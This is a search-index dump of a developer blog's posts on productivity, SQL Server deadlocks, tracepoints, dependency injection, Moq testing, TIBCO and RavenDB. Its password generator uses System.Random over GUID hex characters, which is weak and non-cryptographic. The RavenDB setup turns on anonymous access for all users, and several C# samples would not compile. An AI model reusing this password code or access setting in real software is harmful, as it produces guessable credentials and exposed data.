http://www.43folders.com/2004/09/03/introducing-the-hipster-pda Look at instapaper.com Productive websites boingboing.net lifehacker.com http://www.theverge.com/ Slides :- [gallery]","title":"Productivity notes"},{"location":"2012/04/2012-04-11-productivity-notes/#notes-and-slides-from-scot-hanselmans-talk-on-productivity-","text":"","title":"Notes and slides from Scot Hanselman's talk on productivity :-"},{"location":"2012/04/2012-04-11-productivity-notes/#notes-","text":"Effectiveness Rule of three [ http://gettingresults.com ]- Write down three outcomes -- of the day -- of the week -- of the month -- of the year Email -- Create rule to move emails CCed to me to a different label -- Check email on schedule time -- five.sentenc.es Psychic Weight Get over it Efficiency The pomodoro technique - Download Pomodairo Try to do one thing AND only one thing for 25 minutes Try to track the interupptions -- Internal (Tweet, Stackoverflow, Personal email) -- External (People) DO NOT MULTI TASK Do not pile up books/articles at your desk - you are not going them all. Do not check up on news/sports. Install RescueTime to measure when you are most productive and when you are not Look at https://workflowy.com/ Look at http://www.43folders.com/2004/09/03/introducing-the-hipster-pda Look at instapaper.com Productive websites boingboing.net lifehacker.com http://www.theverge.com/","title":"Notes:-"},{"location":"2012/04/2012-04-11-productivity-notes/#slides-","text":"[gallery]","title":"Slides :-"},{"location":"2012/05/2012-05-03-a-simple-way-to-generate-random-password/","text":"I took que from Ambuj\u2019s post to generate a simple password which is more random. It simply takes random specified number of characters from a guid value. Following is the code. static string GenerateRandomPassword(int numberOfCharactersInPassword) { if (numberOfCharactersInPassword <= 0 || numberOfCharactersInPassword > 32) { throw new ArgumentException(\"A password of only length 1 to 32 can be generated.\"); } string guidWithoutDashes = Guid.NewGuid().ToString(\"n\"); //Console.WriteLine(\"Guid without dashes :- \" + guidWithoutDashes); var chars = new char[numberOfCharactersInPassword]; var random = new Random(); for (int i = 0; i < chars.Length; i++) { chars[i] = guidWithoutDashes[random.Next(guidWithoutDashes.Length)]; } //Console.WriteLine(\"Random password :- \" + new string(chars)); return new string(chars); } The complete project to test quickly can be downloaded from here .","title":"A simple way to generate random password"},{"location":"2012/08/2012-08-29-understanding-and-detecting-deadlocks-in-sql-server/","text":"In order to understand deadlocks, let us first create tables and have some sample data. [sourcecode language=\"sql\" padlinenumbers=\"true\"] /* Tables and data - Start */ IF OBJECT_ID('Order') IS NOT NULL BEGIN DROP TABLE [Order] END IF OBJECT_ID('Customer') IS NOT NULL BEGIN DROP TABLE Customer END CREATE TABLE Customer ( ID int IDENTITY(1,1) CONSTRAINT PK_cid PRIMARY KEY , Name varchar(20) ) CREATE TABLE [Order] ( ID int IDENTITY(1,1) CONSTRAINT PK_oid PRIMARY KEY , CustomerId int, OrderDate datetime ) ALTER TABLE [Order] ADD FOREIGN KEY (CustomerID) REFERENCES Customer(ID) INSERT INTO Customer (Name) SELECT 'xxx' UNION ALL SELECT 'yyy' UNION ALL SELECT 'zzz' INSERT INTO [Order] (CustomerID, OrderDate) SELECT 1, GetDate() UNION ALL SELECT 2, GetDate() UNION ALL SELECT 3, GetDate() /* Tables and data - End*/ [/sourcecode] Open Sql Profiler and use the \u201cTSQL_Locks\u201d template. In the \u201cEvent selection\u201d tab, make sure you have \u201cDeadlock Graph\u201d selected and the click \u201cRun\u201d. In SSMS, open two new query windows and execute the below batches in those two separate windows at the same time (Hit F5 in one window, switch to the another and hit F5). **Batch 1 ** [sourcecode language=\"sql\"] /*Transaction A updates record A in table A - Waits and then updates record B in table B*/ BEGIN TRANSACTION UPDATE Customer SET Name = 'aaa' WHERE ID=1 WAITFOR DELAY '00:00:10' -- Waiting for 10 secs UPDATE [Order] SET CustomerId = 1 WHERE ID = 2 COMMIT TRANSACTION [/sourcecode] Batch 2 [sourcecode language=\"sql\"] /*Transaction B updates record B in table B - Waits and then updates the updates record A in table A */ -- This causes deadlock BEGIN TRANSACTION UPDATE [Order] SET OrderDate = GetDate() WHERE Id = 2 WAITFOR DELAY '00:00:10' -- Waiting for 10 secs UPDATE Customer SET Name = 'bbb' WHERE Id=1 COMMIT TRANSACTION [/sourcecode] You will notice that the batch 1 transaction took affect but because batch 2 couldn\u2019t as that was identified as deadlock victim. Look at the profiler now. Notice that the Batch 2 didn\u2019t get committed (See the big blue cross on the left circle and the tool tip on it in the above screenshot from the profiler?). However the Batch 1 did go through and took effect (see below). Note that If the above batches (separate transactions) were updating two different records at the same time, there wont be any deadlocks. [sourcecode language=\"sql\"] /* Transaction A updates record A in table A waits and the updates record B in table B*/ BEGIN TRANSACTION UPDATE Customer SET Name = 'aaa' WHERE ID=2 PRINT 'Customer updated...' WAITFOR DELAY '00:00:10' -- Waiting for 10 secs UPDATE [Order] SET CustomerId = 1 WHERE ID = 2 PRINT 'Order updated...' COMMIT TRANSACTION [/sourcecode] [sourcecode language=\"sql\"] /* Should be executed on a separate query window Transaction B updates record C in table A waits and the updates record C in table B */ BEGIN TRANSACTION UPDATE [Order] SET OrderDate = GetDate() WHERE Id = 3 PRINT 'Order updated' WAITFOR DELAY '00:00:10' -- Waiting for 5 secs UPDATE Customer SET Name = 'bbb' WHERE Id=3 PRINT 'Customer updated' COMMIT TRANSACTION [/sourcecode]","title":"Understanding and detecting deadlocks in Sql Server"},{"location":"2012/09/2012-09-07-using-tracepoints-in-visual-studio/","text":"Tracepoints in Visual Studio is a less known feature which really could save lot of our time in debugging .NET applications. Let us just get straight into it. Consider the following simplest loop (and simultaneously think about the most complex loop you have ever written). The intention here to determine the value of i and j at the end of each iteration of the for loop on the debug time. There is a breakpoint on the line 23:- Now right click on the red dot and choose \u201cWhen Hit\u201d:- [In VS.NET 2008,you can insert a tracepoint by right clicking on a line and choose Breakpoint > Insert Tracepoint] And you should be presented with the following dialog:- Check the checkbox \u201cPrint a message\u201d and that would enable the textbox immediately below it. Notice that the \u201cContinue Execution\u201d checkbox gets checked too. Leave that as it is. You can place whatever debugging code to print the values of the in-scope variables on run time. For this example, we put the following:- Notice the i and j in curly braces and that\u2019s how the variables are represented here. You can place any in-scope variable on that line. That could be a value type variable like i and j or any of your in-scope class\u2019s property or any in-scope FCL object\u2019s property (e.g.XmlDocument.InnerXML). When you click \u201cOK\u201d, the breakpoint red dot symbol changes to a diamond shaped one and that\u2019s our tracepoint. Before you do anything, just make sure you have the output window visible [Choose the menu View > Output OR Ctrl+W,O] and start the project with debugging. You should see the following in your output window. If you see, we could print the values for the entire execution without changing the program. Tracepoints behave just like breakpoints so we can take the liberty of calling them an extension of breakpoints.You can disable them, delete them, build the solution in the release mode when you don\u2019t want them just like breakpoints. If you are still not convinced, think of the following:- a) If you would have added a \u201c watch \u201d for i and j , you could see the value of i and j, however, that would have only been the current value not their values for the entire execution.Tracepoints do exactly what watches don\u2019t do for you. b) If you could have put the Debug.WriteLine() statement, to print the variable values, you have this maintenance of removing them and I am talking about those large sized projects you are working/worked on. c) If you could just have a breakpoint placed over and you wanted to do F5 (never mind million number of times) and you have this nested loop, you always wander around the code placing the cursor on the variables on the outer loop to see its value [because you forgot to place a watch on that J]. Then you forget what was the value of the variable in the previous iteration of the for loop, so you either start the execution again or change its value in the immediate window and so on. I have seen this many times and have done that too and I think it wastes some real good proportion of our time which rather should get utilized in better portion of coding. Conclusion:- While the breakpoints and watches etc. have still their place, Tracepoints help us quickly tracing and evaluating our program and are good to add in our debugging armory.","title":"Using Tracepoints in Visual Studio"},{"location":"2012/09/2012-09-09-inversion-of-control-ioc/","text":"Dependency Inversion Principle (DIP) \u2013 Principle of inverting dependencies in software architecture. Inversion Of Control (IoC) \u2013 Pattern which uses DIP. Dependency Injection (DI) \u2013 An Implementation of IoC (but there are many other ways to implement IoC). IoC Container \u2013 Framework to implement IoC. Dependency Inversion Principle :- The higher level modules define interfaces which lower level modules implement. This needs to be done instead of higher level modules depending and using the interfaces which lower level modules expose. Example :- The computer is a high level device/module. It has an USB port \u2013 the interface exposed \u2013 to which all other (low level modules) devices e.g iPhone, mouse, Keyboard can plug into. The computer can make use of any device as long as that device can connect to the USB port. Inversion of Control :- Provide ways to implement DIP. Interface Inversion Dependency Creation/Binding Inversion Factory methods Service Locator Dependency Injection Interface Inversion :- Suppose we have following classes :- ATest, BTest1, BTest2, BTest3 BTest1, BTest2 and BTest3 do similar BTest type of work which they have implemented with DoB1Work(), DoB2Work() and DoB3Work() respectively. Now class ATest needs to call public methods (interface) of BTest1, BTest2 and BTest3 separately. Here Class \u201cATest\u201d is the consumer and all those B classes are providers. [sourcecode language=\"csharp\"] public class ATest { public void DoSomeAWork() { BTest1 b = new BTest1(); b.DoSomeBWork(); // Do something else } } public class BTest1 { public void DoSomeBWork() { // Do something } } [/sourcecode] So here, the consumer (ATest) needs to know about each provider (BTest1, BTest2 and BTest3). The \u201ccontrol\u201d here is in providers\u2019 (B classes) hand because they are defining interfaces (public methods) which the consumer needs to call and need to be changed If the public method changes. What should really happen \u2013 We create an interface IBTest having one method DoBWork() which would be implemented by all the B classes with their own concrete implementation. Here we inverted the control. The control is in consumer\u2019s (Class A) hands now. Now we end up having something like below in Class ATest. IBTest bTest = new B1Test(); Now with above, we are still instantiating a concrete class (B1Test) and this makes the ATest (Consumer) dependent on class B1Test (Provider). Dependency Creation/Binding Inversion patterns These patterns let creation of dependencies to be done by another class. Following are the ways to do it. a) Factory Pattern b) Service Locator c) Dependency Injection","title":"Inversion of Control (IoC)"},{"location":"2012/09/2012-09-10-dependency-injection/","text":"Sample code can be downloaded from here . First - What is a dependency? - We are talking about a class (say \u201cATest\u201d) which needs another class (say \u201cBTest\u201d) to call Its (\u201cATest\u201d) methods (See below example). Therefore, class \u201cBTest\u201d is a dependency for class \u201cATest\u201d. [sourcecode language=\"csharp\"] public class BTest { public int DoBTestWork() { // Do some work } } public class ATest { private readonly BTest bTest; // Dependency public ATest() { bTest = new BTest(); } public void DoATestWork() { var bTestOutput = bTest.DoBTestWork(); // Do something with bTestOutput } } [/sourcecode] Can we try decoupling class ATest and BTest . Yes \u2013 try interfaces. Here in the below example. We have the same classes as above. However \u2013 this time we have the method in BTest coming from the interface IBTest. Class ATest is now have the object reference of interface IBTest instead of BTest class. [sourcecode language=\"csharp\"] public interface IBTest { int DoBTestWork() } public class BTest : IBTest { public int DoBTestWork() { // Do some work } } public class ATest { private readonly IBTest bTest; void ATest() { bTest = new BTest(); } public void DoATestWork() { var bTestOutput = bTest.DoBTestWork(); // Do something with bTestOutput } } [/sourcecode] Is this good enough? No. Because we we still have the reference of BTest in the ATest class. See \u2013 the even though the object bTest is of type IBTest, It is getting instantiated from BTest. So the classes \u2013 ATest and BTest are still not decoupled. What is Dependency injection? - It\u2019s a type of IoC which let us take out the dependencies of a class and handles their (dependencies) creation and binding. This way the class no longer has to have the references of the dependencies. How to we implement it :- Constructor Injection Property/Setter Injection Method Injection Constructor Injection Pass dependency into the dependent class via the constructor. Here, the constructor on ATest is taking an interface of IBTest and we don\u2019t have any reference of the concrete class BTest. [sourcecode language=\"csharp\"] public interface IBTest { int DoBTestWork() } public class BTest : IBTest { public int DoBTestWork() { // Do some work } } public class ATest { private readonly IBTest bTest; void ATest (IBTest bTest) { this.bTest = bTest; } public void DoATestWork() { var bTestOutput = bTest.DoBTestWork(); // Do something with bTestOutput } } [/sourcecode] Following is the code which would call use ATest and pass the its dependency BTest in it. [sourcecode language=\"csharp\"] IBTest bTest = new BTest(); ATest aTest = new ATest(bTest); aTest.DoATestWork(); [/sourcecode] Property/Setter Injection Don\u2019t pass dependency in the constructor of the dependent class. Just have the interface dependency types as public properties in the dependent class. [sourcecode language=\"csharp\"] public interface IBTest { int DoBTestWork() } public class BTest : IBTest { public int DoBTestWork() { // Do some work } } public class ATest { public IBTest BTestObject { get; set; } public void DoATestWork() { var bTestOutput = BTestObject.DoBTestWork(); // Do something with bTestOutput } } [/sourcecode] Following is the code which would call use ATest. It just sets the the public property of dependency interface type (IBTest) to the concrete type(BTest). [sourcecode language=\"csharp\"] IBTest bTest = new BTest(); ATest aTest = new ATest(); aTest.BTestObject = bTest; aTest.DoATestWork(); [/sourcecode] We should use this have some optional properties and having those properties not assigned won\u2019t impact calling methods. Method Injection Don\u2019t pass dependencies in the constructor or set them on the properties of the dependent class. Just pass them in the method of the dependent class. [sourcecode language=\"csharp\"] public interface IBTest { int DoBTestWork() } public class BTest : IBTest { public int DoBTestWork() { // Do some work } } public class ATest { public void DoATestWork(IBTest bTest) { var bTestOutput = bTest.DoBTestWork(); // Do something with bTestOutput } } [/sourcecode] Following is the code which would call use ATest. It just passes the dependency interface type (IBTest) to the dependent ATest method DoATestWork. [sourcecode language=\"csharp\"] ATest aTest = new aTest(); IBTest bTest = new BTest(); aTest.DoATestWork(bTest); [/sourcecode]","title":"Dependency Injection"},{"location":"2012/09/2012-09-17-generate-random-password/","text":"A simple way to generate the password [sourcecode language=\"csharp\"] static string GenerateRandomPassword(int numberOfCharactersInPassword) { if (numberOfCharactersInPassword > 32) { throw new ArgumentException(\"A password of length more than 32 can't be generated\"); } string guidWithoutDashes = Guid.NewGuid().ToString(\"n\"); Console.WriteLine(\"Guid without dashes :- \"+ guidWithoutDashes); var chars = new char[numberOfCharactersInPassword]; var random = new Random(); for (int i = 0; i < chars.Length; i++) { chars[i] = guidWithoutDashes[random.Next(guidWithoutDashes.Length)]; } Console.WriteLine(\"Random password :- \" + new string(chars)); return new string(chars); } [/sourcecode]","title":"Generate random password"},{"location":"2012/10/2012-10-16-unit-testing-a-static-method-which-calls-another-static-method/","text":"Recently I came across code like below in UI (code behind) which basically calls a static method on a repository :- RandomPage.aspx.cs :- [sourcecode language=\"csharp\"] protected void btnSave_Click(object sender, EventArgs e) { Guid id = Guid.NewId(); string name = txtName.Text; RandomRepository.RandomStaticMethod(id, name); } [/sourcecode] Now let us look at the \u201cRandomStaticMethod()\u201d method in the \u201cRandomRepository\u201d class. The method just calls couple of another static methods in the \u201cDataAccess\u201d class. RandomRepository.cs :- [sourcecode language=\"csharp\"] /// /// Repository for some random data access /// public class RandomRepository { /// /// Name of the stored procedure to insert data in a table /// private const string SomeRandomTableInsertSP = \"SomeRandomTable_Insert\"; /// <summary> /// The connection string /// </summary> private const string ConnectionString = \"Random connection string\"; #region Static method /// <summary> /// A random static \"Factory\" method /// </summary> /// <param name=\"id\">The value for the Id parameter.</param> /// <param name=\"name\">The value for the Name parameter.</param> public static void RandomRepositoryMethod(Guid id, string name) { DataAccess.ExecuteNonQuery( ConnectionString, SomeRandomTableInsertSP, DataAccess.CreateParameter(\"@Id\", SqlDbType.UniqueIdentifier, id), DataAccess.CreateParameter(\"@Name\", SqlDbType.NVarChar, name)); } #endregion } [/sourcecode] DataAccess.cs:- **[sourcecode language=\"csharp\"] /// /// Classes for the database operations /// public class DataAccess { /// /// Creates the parameter. /// /// The name of the parameter. /// The type of the parameter. /// The value of the parameter. /// The SqlParameter public static SqlParameter CreateParameter(string name, SqlDbType type, object value) { return new SqlParameter { ParameterName = name, SqlDbType = type, Value = value }; } /// <summary> /// Executes the query. /// </summary> /// <param name=\"connectionString\">The connection string.</param> /// <param name=\"storedProcedure\">The stored procedure.</param> /// <param name=\"inParameters\">The in parameters.</param> public static void ExecuteNonQuery(string connectionString, string storedProcedure, params DbParameter\\[\\] inParameters) { // Do some actual database operations here } } [/sourcecode]** ** What do we need to test? **- RandomRepositoryMethod(). We need to test If It could call DataAccess.ExecuteNonQuery() with appropriate number/type/values of parameters. Why? In this example, I have only two parameters. However, in real world, you might be using a lot more than that. I have seen about 20 parameters being passed and many time have made mistakes by copying pasting the same parameters and getting the error later. If you say you never made that mistake, you must be lying. Now, read on\u2026 If you look at RandomRepositoryMethod() you see that the RandomRepository class is dependent on the DataAccess class which does the actual database operations. Since this is a unit test for RandomRepositoryMethod() and not for DataAccess and we don\u2019t want to interact with the actual database, we need to \u201cmock\u201d the DataAccess class. How to mock the DataAccess here? Add an interface \u201cIDataAccess\u201d which has the dependency methods \u2013 CreateParameter and ExecuteNonQuery. Explicitly implement the IDataAccess methods \u2013 CreateParameter() and ExecuteNonQuery() on the DataAccess class. The explicitly implemented interface methods \u2013 CreateParameter() and ExecuteNonQuery() should just call their static counter parts. Inject the dependency (DataAccess) to the dependent method. Write the unit test method using Moq. IDataAccess interface :- [sourcecode language=\"csharp\"] /// /// An interface for DataAccess /// public interface IDataAccess { /// /// Creates a SqlParameter with the given name, type, and value. /// /// The name of the parameter. /// The type of the parameter. /// The value of the parameter. /// Returns a SqlParameter created with the given arguments. SqlParameter CreateParameter(string name, SqlDbType type, object value); /// <summary> /// Executes the given stored procedure. /// </summary> /// <param name=\"connectionString\">The connection string.</param> /// <param name=\"storedProcedure\">The stored procedure.</param> /// <param name=\"inParameters\">The parameters to pass into the stored procedure.</param> void ExecuteNonQuery(string connectionString, string storedProcedure, params DbParameter\\[\\] inParameters); } [/sourcecode] Explicitly implementing the interface Explicitly implemented methods are in line 35 and 47 which just call their static counterparts. [sourcecode language=\"csharp\"] /// /// Classes for the database operations /// public class DataAccess : IDataAccess { /// /// Creates the parameter. /// /// The name of the parameter. /// The type of the parameter. /// The value of the parameter. /// The SqlParameter public static SqlParameter CreateParameter(string name, SqlDbType type, object value) { return new SqlParameter { ParameterName = name, SqlDbType = type, Value = value }; } /// <summary> /// Executes the query. /// </summary> /// <param name=\"connectionString\">The connection string.</param> /// <param name=\"storedProcedure\">The stored procedure.</param> /// <param name=\"inParameters\">The in parameters.</param> public static void ExecuteNonQuery(string connectionString, string storedProcedure, params DbParameter\\[\\] inParameters) { // Do some database operation here } /// <summary> /// Calls the static ExecuteNonQuery() method /// </summary> /// <param name=\"connectionString\">The connection string.</param> /// <param name=\"storedProcedure\">The stored procedure.</param> /// <param name=\"inParameters\">The in parameters.</param> void IDataAccess.ExecuteNonQuery(string connectionString, string storedProcedure, params DbParameter\\[\\] inParameters) { DataAccess.ExecuteNonQuery(connectionString, storedProcedure, inParameters); } /// <summary> /// Calls the static CreateParameter() method /// </summary> /// <param name=\"name\">The name of the parameter.</param> /// <param name=\"type\">The type of the parameter.</param> /// <param name=\"value\">The value of the parameter.</param> /// <returns>The SqlParameter</returns> SqlParameter IDataAccess.CreateParameter(string name, SqlDbType type, object value) { return DataAccess.CreateParameter(name, type, value); } } [/sourcecode] Inject the dependency in the dependent method ( Method injection ) Modify the dependent method to accept a parameter of type IDataAccess. You need to pass an instance of DataAccess from your UI code too. [sourcecode language=\"csharp\"] /// /// A random static \"Factory\" method /// /// The value for the Id parameter. /// The value for the Name parameter. /// The data access. public static void RandomRepositoryMethod(Guid id, string name, IDataAccess dataAccess) { dataAccess.ExecuteNonQuery( ConnectionString, SomeRandomTableInsertSP, DataAccess.CreateParameter(\"@Id\", SqlDbType.UniqueIdentifier, id), DataAccess.CreateParameter(\"@Name\", SqlDbType.NVarChar, name)); } [/sourcecode] Write the unit test method :- [sourcecode language=\"csharp\" padlinenumbers=\"true\" gutter=\"true\"] /// ///A test for RandomRepositoryMethod /// [TestMethod()] public void RandomRepositoryMethodTest() { Guid idValue = new Guid(\"73592249-AD57-4CDF-B5FC-9C30F65C2376\"); string nameValue = \"test\"; var dataAccess = new Mock (); IDataAccess actualDataAccess = new DataAccess(); dataAccess.Setup(a => a.CreateParameter(It.IsAny (), It.IsAny (), It.IsAny ())) .Returns ((name, type, value) => actualDataAccess.CreateParameter(name, type, value)); RandomRepository.RandomRepositoryMethod(idValue, nameValue, dataAccess.Object); dataAccess.Verify( d => d.ExecuteNonQuery(It.IsAny<string>(), \"SomeRandomTable\\_Insert\", new DbParameter\\[\\]{ It.Is<SqlParameter>(p=>p.ParameterName == \"@Id\" && p.SqlDbType == SqlDbType.UniqueIdentifier && (Guid)p.Value == idValue), It.Is<SqlParameter>(p=>p.ParameterName == \"@Name\" && p.SqlDbType == SqlDbType.NVarChar && (string)p.Value == nameValue)} ), Times.Once()); } [/sourcecode] Lines 07 and 08 set up the value for the \u201cId\u201d and \u201cName\u201d parameters. Line 09 creates a mock of the IDataAccess interface. Line 10 creates an instance of real DataAccess class. Why do we need an instance of DataAccess class? \u2013 Because, the ExecuteNonQuery() calls CreateParameter() to return an instance of SqlParameter. We need to set that up to return a SqlParameter If we call CreateParameter() with \u201cany\u201d string parameter, \u201cany\u201d SqlDbType and \u201cany\u201d object value. That\u2019s what line 11 and 12 (they are actually one statement) are doing. Line 14 \u2013 Calls the static method. Lines 15 \u2013 19 (all lines are actually one statement) Verifies that dataAccess.ExecuteNonQuery was called with \u201cany\u201d string (any connection string), the required stored procedure (\u201cSomeRandomTable_Insert\u201d) and two SqlParameters \u2013 first having parameter name \u201c@Id \u201d, type SqlDbType.UniqueIdentifier and of value \"73592249-AD57-4CDF-B5FC-C30F65C2376\" AND second having parameter name \u201c@Name \u201d, type SqlDbType.NVarChar and of value \u201ctest\u201d. It also verifies that the DataAccess.ExecuteNonQuery() was called exactly one time. That\u2019s it \u2013 you have unit tested your static method. There is one caveat \u2013 you need to pass the DataAccess object to each method you want to test (Method Injection). You couldn\u2019t pass the dataAccess object to the class\u2019s constructor because then that instance of dataAccess can not be accessed in the static method. It won\u2019t compile. [sourcecode language=\"csharp\"] public class RandomRepository { /// /// DataAccess object /// IDataAccess dataAccess = null; /// <summary> /// Initializes a new instance of the <see cref=\"RandomRepository\" /> class. /// </summary> /// <param name=\"dataAccess\">The data access.</param> public RandomRepository(IDataAccess dataAccess) { this.dataAccess = dataAccess; } /// <summary> /// A random static \"Factory\" method /// </summary> /// <param name=\"id\">The value for the Id parameter.</param> /// <param name=\"name\">The value for the Name parameter.</param> public static void RandomRepositoryMethod(Guid id, string name) { // Won't compile - \"An object reference is required to access non-static member\" dataAccess.ExecuteNonQuery( ConnectionString, SomeRandomTableInsertSP, DataAccess.CreateParameter(\"@Id\", SqlDbType.UniqueIdentifier, id), DataAccess.CreateParameter(\"@Name\", SqlDbType.NVarChar, name)); } } [/sourcecode] Personally, I didn\u2019t like the ExecuteNonQuery() and CreateParameter() being static. Sure, static methods have their own advantages . My personal preference is to limit them in the utility classes because I find them difficult (read \u201cless easy\u201d) to unit test. I just wanted to mention that performance difference between static method and instance method is negligible. From http://msdn.microsoft.com/en-us/library/79b3xss3.aspx A call to a static method generates a call instruction in Microsoft intermediate language (MSIL), whereas a call to an instance method generates a callvirt instruction, which also checks for a null object references. However, most of the time the performance difference between the two is not significant.","title":"Unit testing a static method which calls another static method using Moq"},{"location":"2012/12/2012-12-31-2012-in-review/","text":"The WordPress.com stats helper monkeys prepared a 2012 annual report for this blog. Here's an excerpt: 600 people reached the top of Mt. Everest in 2012. This blog got about 11,000 views in 2012. If every person who reached the top of Mt. Everest viewed this blog, it would have taken 18 years to get that many views. Click here to see the complete report.","title":"2012 in review"},{"location":"2013/04/2013-04-01-connecting-to-mysql-database-and-fetching-records-using-jdbc-connection-in-tibco-businessworks/","text":"This looks as na\u00efve as connecting to a database from .NET using standard connection class. But, hey, that was interesting/exciting as well first time when you did that. In this example, we will connect to a MySql database from TIBCO Businessworks, fetch records and write the first record to a text file \u2013 as simple as that. Create an empty project in TIBCO BusinessWorks designer:- Save the project with the directory path :- Your project pane would look something like this :- Now, we need to add a JDBC connection. A JDBC Connection is a resource in TIBCO designer. Therefore for better organization, we create a \u201cResources\u201d folder. Add the JDBCConnection to the \u201cResources\u201d folder as shown below. JDBC Connection would be added as shown below and we need to select the driver and the connection string for the mysql database. Don\u2019t forget the username and password. Click \u201cTest Connection\u201d to make sure the connection succeeds. When you click \u201cTest Connection\u201d, you might see the below error :- \u201cBW-JDBC-100033 \"Configuration Test Failed. Failed to find or load the JDBC driver. jdbc:mysql://localhost:3306/Research\u201d This really means BusinessWorks cannot see the MySql driver required for the connection. This driver is basically a .jar file [mysql-connector-java-5.1.23-bin.jar] which is located in the MySql installation directory. For my installation the directory is \"C:\\Program Files (x86)\\MySQL\\Connector J 5.1.23\\mysql-connector-java-5.1.23-bin.jar\". All I needed to do is to copy that jar file to the TIBCO installation directory > Lib folder. For me, I needed to copy to \u201cC:\\tibco\\bw\\5.10\\lib\u201d directory. Save the project, close the designer and reopen the project. Now on the JDBC Connection, click \u201cTest Connection\u201d. Voil\u00e0!!! Got connected this time. However, I am pretty sure there must be a better way (may be setting the classpath for the jar file) than copying the jar file itself. Add a new folder named \u201cActivities\u201d to the root folder. Add a \u201cProcess Definition\u201d from the Palettes tab and double click on it to see the start and end points. Add \u201cJDBC Query\u201d from the Palettes tab. In the configuration pane of the JDBC query, select the JDBC Connection as shown below :- Add the Sql statement to get data from the mySql table. My sql statement was :- SELECT ID, Name FROM Product Writing the database query results to text file Create a blank text file named \u201ctest.txt\u201d in your project directory. Add \u201cWrite File\u201d from the Palettes tab and place it after the JDBC query. Connect them using the (\u201cCreate transition\u201d button) as shown below. In the \u201cInput\u201d tab of the \u201cWrite File\u201d, enter the name of the blank text file we created earlier. Now we need to set the contents of the file. The contents of the file would be the first record from the resultset returned by the JDBC query. Keep the cursor in the \u201ctextContent\u201d textfield and click on the yellow pencil button. XPath Formula Builder would open. In this, drag the Functions > String >Concat to the XPath Formula text field on the right. Drag \u201cData > JDBC Query > resultSet > Record > Id\u201d onto the < > and Drag \u201cData > JDBC Query > resultSet > Record > Name\u201d onto the < > Since we are getting only one record, change the following :- concat($JDBC-Query/resultSet/Record/Id, $JDBC-Query/resultSet/Record/Name) to this (index = 1 as XPath has starting index as 1):- concat($JDBC-Query/resultSet/Record[1]/Id,\u201d,\u201d,$JDBC-Query/resultSet/Record[1]/Name) Click \u201cApply\u201d on the XPath Formula Builder and then on the Input pane of the \u201cWrite File\u201d. Save the project. Run the project and you would see the file updated with the first record from the database.","title":"Connecting to MySql database and fetching records using JDBC connection in TIBCO BusinessWorks"},{"location":"2013/05/2013-05-01-from-yessql-to-nosql-with-raven-db/","text":"What is \u201cYes\u201dSql? _Question :- Do you know what we can use to store all employees data? Answer :- Yes! I would use a RDBMS (Relational Database Management System) software like Sql Server, MySql, Oracle etc. I would store all your employee data in different database tables with relationships between them. Question :- Do you know how can we can access and manage employees data? Answer :- Yes! I would use a query language named SQL (Structured Query Language) to query and manage data. _If you have been also answering \u201cYes\u201d to the above questions, you have been doing \u201cYes\u201dSQL . I have been doing the \u201cYes\u201dSQL for quite some time and feeling like the frog in its well of RBMS\u2019s without even realizing the outside world has become better and should be explored. source :- http://bit.ly/VVxmMU What is NoSql Stop being the \u201cfrog in the well\u201d!! Take the red pill and find out how deep the rabbit hole goes. What is NoSQL As we have been doing \u201cYes\u201dSQL for quite some time, we will first take a look at what we have been doing for storing and retrieving data. Following is very simplified employee database tables. Add some data:- BEGIN TRY BEGIN TRAN INSERT INTO Department(Id, Name) VALUES(1, 'Accounts') INSERT INTO Department(Id, Name) VALUES(2, 'Engineering') INSERT INTO Employee (ID, Name, DepartmentID) VALUES (1, 'Ashish', 1) INSERT INTO Employee (ID, Name, DepartmentID) VALUES (2, 'John', 2) COMMIT END TRY BEGIN CATCH ROLLBACK END CATCH If we want to retrieve name of the employee and the department in which he/she works using the employee id, need to join the two tables :- SELECT E.Name AS EmployeeName, D.Name AS DepartmentName FROM Employee E INNER JOIN Department D ON E.DepartmentID = D.Id WHERE E.Id = 1 Why we needed to join the tables? because all the information for that particular employee is not stored at one table. This is the main characteristic of a RDBMS and this is first thing we need to get off our minds in NoSQL. Now, there are different types of NoSQL databases \u2013 Raven DB, Mongo DB etc. However, in all of them, the basic element is same \u2013 No relationship! In Raven Db, the all data for this employee would be stored in a \u201cdocument\u201d. employees/1 { \"Name\": \"Ashish\", \"Department\": { \"Id\": 1, \"Name\": \"Accounts\" } } As you see \u2013 all data (which includes department details as well) for employee with id \u201c1\u201d is stored in one place \u2013 a \u201cdocument\u201d, in RavenDB terms. This is similar to a \u201crow\u201d in the RDBMS except the fact that data is not distributed in different tables, rather all data is at one place \u2013 in a document. For each employee, there would be be one document. More on this next. NoSQL using RavenDB What is Raven Db Raven DB is a document database. It has following characteristics :- Non- Relational All data is stored and represented in JSON There is no schema Transactional Installation http://hibernatingrhinos.com/builds/ravendb-stable I downloaded the last stable build of Raven DB and extracted to my local \u201cD:\\Ashish\\Research\\RavenDB\u201d folder. Look for /Server/RavenServer.exe.config and change the Anonymous access to \u201cAll\u201d Run the Start.cmd as an administrator. It should open a very nice looking management studio for Raven Db (performing function \u201csimilar\u201d to SQL server management studio). It will ask you to create a new database as you don\u2019t have any. Put a name for the database. The new database is created :- Client application to access and manage data in the Raven DB Adding the RavenDB client to the client application via Nuget Package manager Below is the client code which when executed creates one document per entity (in this example, a company). Notice that a DocumentStore is similar to a connection. We can use the same connection to create multiple documents. However, each document is bound to a session and that\u2019s why It needs to be disposed before creating a new one. Also notice the RabenDb displays the documents created in the server admin browser.","title":"From &ldquo;Yes&rdquo;SQL to NoSQL with Raven Db"},{"location":"2013/05/2013-05-01-from-yessql-to-nosql-with-raven-db/#what-is-yessql","text":"_Question :- Do you know what we can use to store all employees data? Answer :- Yes! I would use a RDBMS (Relational Database Management System) software like Sql Server, MySql, Oracle etc. I would store all your employee data in different database tables with relationships between them. Question :- Do you know how can we can access and manage employees data? Answer :- Yes! I would use a query language named SQL (Structured Query Language) to query and manage data. _If you have been also answering \u201cYes\u201d to the above questions, you have been doing \u201cYes\u201dSQL . I have been doing the \u201cYes\u201dSQL for quite some time and feeling like the frog in its well of RBMS\u2019s without even realizing the outside world has become better and should be explored. source :- http://bit.ly/VVxmMU","title":"What is \u201cYes\u201dSql?"},{"location":"2013/05/2013-05-01-from-yessql-to-nosql-with-raven-db/#what-is-nosql","text":"Stop being the \u201cfrog in the well\u201d!! Take the red pill and find out how deep the rabbit hole goes.","title":"What is NoSql"},{"location":"2013/05/2013-05-01-from-yessql-to-nosql-with-raven-db/#what-is-nosql_1","text":"As we have been doing \u201cYes\u201dSQL for quite some time, we will first take a look at what we have been doing for storing and retrieving data. Following is very simplified employee database tables. Add some data:- BEGIN TRY BEGIN TRAN 